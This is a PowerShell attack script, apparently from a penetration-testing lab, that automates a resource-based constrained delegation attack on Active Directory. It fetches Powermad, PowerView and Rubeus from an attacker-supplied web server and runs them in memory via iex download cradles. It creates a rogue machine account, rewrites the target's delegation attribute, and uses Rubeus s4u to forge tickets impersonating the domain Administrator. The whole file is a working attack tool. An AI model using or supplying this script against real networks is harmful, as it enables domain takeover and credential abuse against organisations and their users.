function Invoke-AutoRBCD{
    <# 
    .SYNOPSIS

        Automagically executes the resource based constrained delegation attack in the current context.
	And requests tickets for the administrative user of the Target.
	No files are written to disk, everything is executed from memory.

     .PARAMETER WebServer

        Specifies the ip adress or hostname where the Scripts Powermad, 
	Powerview and Rubeus.exe can be downloaded

     .PARAMETER Target

        Specifies the Target on which we have the GenericWrite permission.

     .PARAMETER Domain

        Specifies the domain to use when creating the Rubeus tickets

     .Example
 	. ./AutoRBCD.ps1 | Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com

     .Example2 
	(New-Object System.Net.WebClient).DownloadString("http:<serverip>/AutoRBCD.ps1") | iex; Invoke-AutoRBCD -WebServer 192.168.49.68 -Target appsrv01 -Domain prod.corp3.com

#>
	[CmdletBinding()]
	param($WebServer, $Target, $Domain)
	# load the files into memory and import them
	Write-Host "[+] load modules in memory"

	iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/Powermad.ps1")
	iex(New-Object System.Net.WebClient).DownloadString("http://$WebServer/PowerView.ps1")

	$ruby = (New-Object System.Net.WebClient).DownloadData("http://$WebServer/Rubeus.exe")
	$assem = [System.Reflection.Assembly]::Load($ruby)


	# generate a random computer name
	$MachineName = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})

	Write-Host "[+] Add a Machine with the name $MachineName"
	# add the machine account that we just created (Powermad)
	New-MachineAccount -MachineAccount $MachineName -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

	Write-Host "[+] SID Stuff"
	# get the SID of the new computer we've added
	$ComputerSid = Get-DomainComputer $MachineName -Properties objectsid | Select -Expand objectsid

	# build the new raw security descriptor with this computer account as the principal
	$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

	# get the binary bytes for the SD
	$SDBytes = New-Object byte[] ($SD.BinaryLength)
	$SD.GetBinaryForm($SDBytes, 0)

	Write-Host "[+] Set the msds-allowedtoactonbehalfofotheridentity property"
	# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
	Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

	# purge tickets
	[Rubeus.Program]::Main("purge".Split())

	$fqdn = -join($Target,".",$Domain)
	# execute Rubeus' s4u process against $TargetComputer
	#   AA6EAFB522589934A6E5CE92C6438221 == 'h4x'
	#   impersonating "Administrator" (a DA) to the cifs sname for the target computer (primary)
	[Rubeus.Program]::Main("s4u /user:$MachineName`$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:cifs/$fqdn /altservice:http,ldap,krbtgt,winrm /ptt".Split())
}
